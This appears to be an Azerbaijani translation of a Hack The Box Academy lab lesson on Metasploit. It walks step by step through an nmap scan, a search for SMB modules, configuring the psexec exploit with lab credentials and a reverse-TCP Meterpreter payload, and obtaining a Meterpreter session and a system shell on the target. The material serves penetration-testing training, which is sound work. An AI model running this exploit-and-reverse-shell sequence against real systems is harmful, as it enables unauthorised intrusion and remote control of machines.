## Metasploit ilə Payloadların Avtomatlaşdırılması və Çatdırılması

**Metasploit** **Rapid7** tərəfindən hazırlanmış, zəifliklərin istismarını asanlaşdıran, əvvəlcədən qurulmuş modullardan istifadə edərək zəiflikləri istismar etmək və zəif sistemdə shell əldə etmək üçün payloadlar çatdırmaq prosesini düzənləşdirən avtomatlaşdırılmış hücum çərçivəsidir (framework). Metasploit zəif sistemin istismarını o qədər asanlaşdıra bilər ki, bəzi Kibertəhlükəsizlik təlimatçıları laboratoriya imtahanlarında onun istifadəsinə limit qoyurlar. Hack The Box-da biz möhkəm təməl bilik əldə edənə qədər laboratoriya mühitimizdə alətlərlə təcrübə aparmağa təşviq edirik. Əksər təşkilatlar bir işdə (engagement) hansı alətlərdən istifadə edib-etməyəcəyimizi məhdudlaşdırmayacaqlar. Lakin onlar bizdən nə etdiyimizi bilməyimizi gözləyəcəklər. Buna görə də, öyrəndiyimiz zaman dərk etməyə çalışmaq bizim məsuliyyətimizdir. İstifadə etdiyimiz alətlərin təsirlərini başa düşməmək, canlı penetrasiya testi və ya audit zamanı dağıdıcı nəticələrə səbəb ola bilər. Bu, öyrəndiyimiz alətləri, texnikaları, metodologiyaları və tətbiqləri daha dərindən anlamağa davamlı şəkildə çalışmamızın əsas səbəblərindən biridir.

Bu bölmədə biz **Pwnbox**-da Metasploit-in **community edition** (ictimai nəşri) ilə qarşılıqlı əlaqədə olacağıq. Əvvəlcədən qurulmuş **modullardan** istifadə edəcəyik və **MSFVenom** ilə payloadlar hazırlayacağıq. Qeyd etmək vacibdir ki, bir çox tanınmış kibertəhlükəsizlik şirkətləri penetrasiya testləri, təhlükəsizlik auditləri və hətta sosial mühəndislik kampaniyaları aparmaq üçün Metasploit-in ödənişli versiyası olan **Metasploit Pro**-dan istifadə edirlər. Əgər community edition və Metasploit Pro arasındakı fərqləri araşdırmaq istəyirsinizsə, bu **müqayisə cədvəlinə** baxa bilərsiniz.

### Metasploit ilə Təcrübə

Biz bu modulun qalan hissəsini Metasploit haqqında hər şeyi əhatə etməklə keçirə bilərik, lakin biz yalnız **shelllər və payloadlar** kontekstində ən əsaslarla işləməyə gedəcəyik.

Metasploit ilə praktiki işə **msfconsole**-u **root** (sudo msfconsole) kimi işə salmaqla başlayaq.

#### MSF-in Başlanması

```bash
IIIIII    dTb.dTb        _.---._
  II     4'  v  'B   .'"".'/|\`.""'.
  II     6.     .P  :  .' / | \ `.  :
  II     'T;. .;P'  '.'  /  |  \  `.'
  II      'T; ;P'    `. /   |   \ .'
IIIIII     'YvP'       `-.__|__.-'

I love shells --egypt


       =[ metasploit v6.0.44-dev                          ]
+ -- --=[ 2131 exploits - 1139 auxiliary - 363 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 8 evasion                                       ]

Metasploit tip: Writing a custom module? After editing your 
module, why not try the reload command

msf6 >
```

Başlanğıcda banner olaraq yaradıcı ASCII sənəti və bəzi maraqlı rəqəmləri görə bilərik.

  * **2131 exploits** (istismar kodu)
  * **592 payloads** (yükləmə)

Bu rəqəmlər, dəstək verənlər kod əlavə etdikdə və ya çıxardıqda və ya Metasploit-ə istifadə üçün bir modul daxil etdiyinizdə dəyişə bilər. Metasploit payloadları ilə tanış olaq, Windows sistemini kompromat etmək üçün istifadə edilə bilən klassik bir **exploit modulu** istifadə edək. Unutmayın ki, Metasploit təkcə istismar üçün istifadə edilə bilməz. Həmçinin hədəfləri skan etmək və saymaq üçün müxtəlif modullardan istifadə edə bilərik.

Bu vəziyyətdə, Metasploit modulunu seçmək üçün **nmap** skanından əldə edilmiş sayma nəticələrindən istifadə edəcəyik.

#### NMAP Skandanı

```bash
nijatmansimov@htb[/htb]$ nmap -sC -sV -Pn 10.129.164.25Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-09 21:03 UTC
Nmap scan report for 10.129.164.25
Host is up (0.020s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
Host script results:
|_nbstat: NetBIOS name: nil, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:04:e2 (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-09-09T21:03:31
|_  start_date: N/A
```

Çıxışda, adətən Windows sistemində defolt olaraq açıq olan bir neçə standart portu görürük. Unutmayın ki, skan etmə və sayma, Metasploit ilə işlətmək üçün uyğun bir modul tapmaq məqsədilə hədəfimizin hansı ƏS-i (Windows və ya Linux) işlətdiyini öyrənməyin əla bir yoludur. Potensial hücum vektoru kimi **SMB**-ni (port **445**-də dinləyir) seçək.

Bu məlumatı əldə etdikdən sonra, SMB ilə əlaqəli modulları tapmaq üçün Metasploit-in axtarış funksiyasından istifadə edə bilərik. **msfconsole**-da, SMB zəiflikləri ilə əlaqəli modulların siyahısını almaq üçün `search smb` əmrini verə bilərik:

#### Metasploit Daxilində Axtarış

```bash
msf6 > search smb

Matching Modules
================
#    Name                                                          Disclosure Date    Rank   Check  Description  -       ----                                                     ---------------    ----   -----  ---------- 
 41   auxiliary/scanner/smb/smb_ms17_010                                               normal     No     MS17-010 SMB RCE Detection
 42   auxiliary/dos/windows/smb/ms05_047_pnp                                           normal     No     Microsoft Plug and Play Service Registry Overflow
 43   auxiliary/dos/windows/smb/rras_vls_null_deref                   2006-06-14       normal     No     Microsoft RRAS InterfaceAdjustVLSPointers NULL Dereference
 44   auxiliary/admin/mssql/mssql_ntlm_stealer                                         normal     No     Microsoft SQL Server NTLM Stealer
 45   auxiliary/admin/mssql/mssql_ntlm_stealer_sqli                                    normal     No     Microsoft SQL Server SQLi NTLM Stealer
 46   auxiliary/admin/mssql/mssql_enum_domain_accounts_sqli                            normal     No     Microsoft SQL Server SQLi SUSER_SNAME Windows Domain Account Enumeration
 47   auxiliary/admin/mssql/mssql_enum_domain_accounts                                 normal     No     Microsoft SQL Server SUSER_SNAME Windows Domain Account Enumeration
 48   auxiliary/dos/windows/smb/ms06_035_mailslot                     2006-07-11       normal     No     Microsoft SRV.SYS Mailslot Write Corruption
 49   auxiliary/dos/windows/smb/ms06_063_trans                                         normal     No     Microsoft SRV.SYS Pipe Transaction No Null
 50   auxiliary/dos/windows/smb/ms09_001_write                                         normal     No     Microsoft SRV.SYS WriteAndX Invalid DataOffset
 51   auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh                        normal     No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
 52   auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff                           normal     No     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference
 53   auxiliary/dos/windows/smb/vista_negotiate_stop                                   normal     No     Microsoft Vista SP0 SMB Negotiate Protocol DoS
 54   auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop                       normal     No     Microsoft Windows 7 / Server 2008 R2 SMB Client Infinite Loop
 55   auxiliary/scanner/smb/psexec_loggedin_users                                      normal     No     Microsoft Windows Authenticated Logged In Users Enumeration
 56   exploit/windows/smb/psexec                                      1999-01-01       manual     No     Microsoft Windows Authenticated User Code Execution
 57   auxiliary/dos/windows/smb/ms11_019_electbowser                                   normal     No     Microsoft Windows Browser Pool DoS
 58   exploit/windows/smb/smb_rras_erraticgopher                      2017-06-13       average    Yes    Microsoft Windows RRAS Service MIBEntryGet Overflow
 59   auxiliary/dos/windows/smb/ms10_054_queryfs_pool_overflow                         normal     No     Microsoft Windows SRV.SYS SrvSmbQueryFsInformation Pool Overflow DoS
 60   exploit/windows/smb/ms10_046_shortcut_icon_dllloader            2010-07-16       excellent  No     Microsoft Windows Shell LNK Code Execution
```

Axtarışımızla əlaqəli **Matching Modules** (Uyğun Gələn Modullar) uzun bir siyahısını görəcəyik. Hər modulu formatına diqqət edin. Hər modulun sol tərəfində modulu seçməyi asanlaşdırmaq üçün bir sıra, bir **Ad**, **Aşkarlanma Tarixi**, **Sıra**, **Yoxlama** və **Təsvir** var.

> Hər potensial modulun `solundakı` rəqəm, axtarışınız əsasında nisbi bir rəqəmdir və modullar Metasploit-ə əlavə edildikcə hər dəfə bu rəqəmin eyni olmasını gözləməyin.

Payloadlar kontekstində başa düşmək üçün xüsusilə bir modula baxaq.
`56 exploit/windows/smb/psexec`

| Çıxış | Mənası |
| :--- | :--- |
| **56** | Axtarış kontekstində cədvəldə modula təyin edilmiş rəqəm. Bu rəqəm seçməyi asanlaşdırır. Modulu seçmək üçün `use 56` əmrini istifadə edə bilərik. |
| **exploit/** | Modulun növünü müəyyən edir. Bu vəziyyətdə bu bir **exploit moduludur**. MSF-də bir çox exploit modulları, shell seansı yaratmağa çalışan payloadı ehtiva edir. |
| **windows/** | Hədəf aldığımız platformanı müəyyən edir. Bu vəziyyətdə hədəfin Windows olduğunu bilirik, buna görə də exploit və payload Windows üçün olacaq. |
| **smb/** | Moduldakı payloadın yazıldığı xidməti müəyyən edir. |
| **psexec** | Zəif sistemə yüklənəcək aləti müəyyən edir. |

Modulu seçdikdən sonra, promptda ətrafımızdakı xüsusi parametrlərə əsasən modulu konfiqurasiya etmək imkanı verən bir dəyişiklik görəcəyik.

#### Seçim Seçimi

```bash
msf6 > use 56

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/psexec) >
```

Diqqət edin ki, **exploit** mötərizənin xaricindədir. Bu, MSF modul növünün bir exploit olduğunu və xüsusi exploit və payloadın Windows üçün yazıldığını göstərir. Hücum vektoru **SMB**-dir və **Meterpreter** payloadı **psexec** istifadə edilərək çatdırılacaq. Bu exploitdən istifadə etmək və payloadı çatdırmaq haqqında daha çox məlumat əldə etmək üçün **options** əmrindən istifadə edək.

#### Exploit Seçimlərinin Tədqiqi

```bash
msf6 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name   SHARE                                  no        The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write fo                                                    lder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBUser                                no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     68.183.42.102    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

Bu, Metasploit-in istifadə rahatlığı baxımından parladığı sahələrdən biridir. Modul seçimlərinin çıxışında biz hər bir parametrin nə demək olduğunu təsvir edən müxtəlif seçimləri və ayarları görürük. Biz bu bölmədə **SERVICE\_DESCRIPTION**, **SERVICE\_DISPLAY\_NAME** və **SERVICE\_NAME**-dən istifadə etməyəcəyik. Diqqət edin ki, bu xüsusi exploit **Meterpreter** istifadə edərək **reverse TCP** shell bağlantısından istifadə edəcək. Bir Meterpreter shell, bu modulun əvvəlki bölmələrində müəyyən etdiyimiz kimi, təmiz (raw) bir TCP reverse shell-dən daha çox funksionallıq verir. Bu, Metasploit-də istifadə edilən defolt payloaddır.

Aşağıdakı parametrləri konfiqurasiya etmək üçün **set** əmrindən istifadə edəcəyik:

#### Seçimlərin Təyin Edilməsi

```bash
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
RHOSTS => 10.129.180.71msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
SHARE => ADMIN$
msf6 exploit(windows/smb/psexec) > set SMBPass HTB_@cademy_stdnt!
SMBPass => HTB_@cademy_stdnt!
msf6 exploit(windows/smb/psexec) > set SMBUser htb-student
SMBUser => htb-student
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
LHOST => 10.10.14.222
```

Bu parametrlər payloadımızın düzgün hədəfə (**RHOSTS**) çatdırılmasını, etimadnamələrdən (**SMBPass** və **SMBUser**) istifadə edərək defolt inzibati paylaşmaya (**ADMIN$**) yüklənməsini və sonra yerli host maşınımızla (**LHOST**) **reverse shell** bağlantısı başlatmasını təmin edəcək.

Bu parametrlər hücum qutunuzdakı və hədəf qutunuzdakı IP ünvanına, eləcə də bir iş zamanı toplaya biləcəyiniz etimadnamələrə xüsusi olacaq. **LHOST** (yerli host) VPN tunel IP ünvanını və ya VPN tunel interfeys ID-sini təyin edə bilərik.

#### Exploit-i Başlamaq

```bash
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.222:4444 
[*] 10.129.180.71:445 - Connecting to the server...
[*] 10.129.180.71:445 - Authenticating to 10.129.180.71:445 as user 'htb-student'...
[*] 10.129.180.71:445 - Selecting PowerShell target
[*] 10.129.180.71:445 - Executing the payload...
[+] 10.129.180.71:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175174 bytes) to 10.129.180.71
[*] Meterpreter session 1 opened (10.10.14.222:4444 -> 10.129.180.71:49675) at 2021-09-13 17:43:41 +0000

meterpreter >
```

**exploit** əmrini verdikdən sonra, exploit işə salınır və Meterpreter payloadından istifadə edərək payloadı hədəfə çatdırmağa cəhd edilir. Gördüyünüz çıxışda Metasploit bu prosesin hər addımını geri bildirir. Bunun uğurlu olduğunu bilirik, çünki bir **stage** uğurla göndərildi, bu da bir Meterpreter shell seansını (`meterpreter >`) və sistem səviyyəli shell seansını yaratdı. Unutmayın ki, Meterpreter, bir hücum qutusu ilə hədəf arasında gizli şəkildə bir rabitə kanalı yaratmaq üçün yaddaş daxilində (in-memory) DLL inyeksiyasından istifadə edən bir payloaddır. Düzgün etimadnamələr və hücum vektoru bizə faylları yükləmək və endirmək, sistem əmrlərini icra etmək, keylogger işlətmək, xidmətləri yaratmaq/başlatmaq/dayandırmaq, prosesləri idarə etmək və daha çox imkan verir.

Bu vəziyyətdə, **Rapid 7 Module Documentation**-da ətraflı göstərildiyi kimi: "Bu modul, ixtiyari bir payload icra etmək üçün etibarlı bir administrator istifadəçi adı və parolundan (və ya parol hashından) istifadə edir. Bu modul SysInternals tərəfindən təmin edilən "psexec" utilitinə bənzəyir. Bu modul indi özünü təmizləyə bilir. Bu alət tərəfindən yaradılan xidmət təsadüfi seçilmiş bir ad və təsvirdən istifadə edir."

Digər əmr dili tərcüməçiləri (Bash, PowerShell, ksh, və s.) kimi, Meterpreter shell seansları da hədəf sistemlə qarşılıqlı əlaqə qurmaq üçün istifadə edə biləcəyimiz bir sıra əmrlər verməyə imkan verir. İstifadə edə biləcəyimiz əmrlərin siyahısını görmək üçün `?` simvolunu istifadə edə bilərik. Meterpreter shell-də məhdudiyyətlər görəcəyik, buna görə də hədəfimizə xas olan tam sistem əmrləri dəsti ilə işləməyə ehtiyacımız varsa, sistem səviyyəli shell-ə düşmək üçün **shell** əmrini istifadə etməyə cəhd etmək yaxşıdır.

#### İnteraktiv Shell

```bash
meterpreter > shell
Process 604 created.
Channel 1 created.
Microsoft Windows [Version 10.0.18362.1256]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>
```
